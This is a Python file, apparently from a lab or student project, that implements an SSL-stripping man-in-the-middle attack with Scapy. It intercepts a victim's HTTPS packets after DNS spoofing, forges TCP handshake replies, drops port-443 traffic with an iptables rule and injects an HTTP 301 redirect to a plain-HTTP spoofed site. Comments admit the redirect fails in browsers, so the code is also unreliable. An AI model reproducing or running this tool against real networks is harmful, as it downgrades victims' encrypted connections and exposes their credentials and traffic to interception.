from scapy.all import *
from scapy.layers.inet import IP
from logger import log_info, log_warning
from scapy.layers.http import TCP, Raw
import atexit

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker, site_to_spoof):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_attacker = ip_attacker
        self.site_to_spoof = site_to_spoof

    def strip(self):
        log_info("Starting SSL stripping")
        # Add an iptables rule to drop incoming packets for port 443
        add_iptables_rule(443)
        sniff(
            filter="tcp and port 443",
            prn=self._on_https_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping SSL stripping")

    def _on_https_request(self, packet):
        # Completely ignore packets not coming from victim:
        if packet[IP].src != self.ip_victim:
            return

        # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
        if packet[IP].dst != self.ip_attacker:
            log_warning("Ignoring packet from {} because it is not intended for us but for {}".format(packet[IP].src, packet[IP].dst))
            return
        
        # Do nothing on RST
        if packet.haslayer(TCP) and packet[TCP].flags == 0x04:
            log_warning("Ignoring RST packet from {}".format(packet[IP].src))
            return

        # Check if we have a SYN packet to start the handshake.
        if packet.haslayer(TCP) and packet[TCP].flags == 0x02:  # SYN
            log_info("Received SYN packet from {}".format(packet[IP].src))
            
            # Construct the SYN-ACK packet
            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="SA", 
                            seq=1001, ack=packet[TCP].seq + 1))
            
            send(response, verbose=0)
            log_info("Sent SYN-ACK packet to {}".format(packet[IP].src))

        # Handle FIN-ACK packets
        if packet.haslayer(TCP) and packet[TCP].flags == 0x11:
            log_info("Received FIN-ACK packet from {}".format(packet[IP].src))
            # Construct the response
            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="FA", 
                            seq=packet[TCP].ack, ack=packet[TCP].seq + 1))
            send(response, verbose=0)
            log_info("Sent FIN-ACK packet to {}".format(packet[IP].src))

        # Check if we have an ACK packet to complete the handshake.
        elif packet.haslayer(TCP) and packet[TCP].flags == 0x10:  # ACK
            log_info("Received ACK packet from {}".format(packet[IP].src))
            # Handshake is complete; next packet should be SSL Client Hello or similar.

        # Check if it's an HTTPS request (Client Hello packet or other)
        elif packet.haslayer(TCP) and len(packet[TCP].payload) > 0:
            log_info("Received HTTPS request for {} from {}".format(packet[IP].dst,packet[IP].src))

            # TODO: For some reason this 301 is not correctly interpreted by the client.
            # TODO: The client does not redirect to the http site. It instead shows an error: "ssl_error_rx_record_too_long"
            # TODO: Some sources suggest that his redirect message should be sent over port 80 instead of 443. but that does not work either.
            # NOTE: Everything looks fine in Wireshark, but the client does not redirect.

            # Construct the HTTP 301 Moved Permanently response
            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA",
                            seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[TCP].payload)) /
                        Raw(load="HTTP/1.1 301 Moved Permanently\r\n"
                                 "Location: http://{}\r\n\r\n".format(self.site_to_spoof)))
            
            send(response, verbose=0)
            log_info("Sent HTTP response to {}".format(packet[IP].src))


def add_iptables_rule(port):
    # Add the iptables rule to drop incoming packets for the specified port
    subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])

def remove_iptables_rule(port):
    # Remove the iptables rule
    subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])


atexit.register(remove_iptables_rule, 443)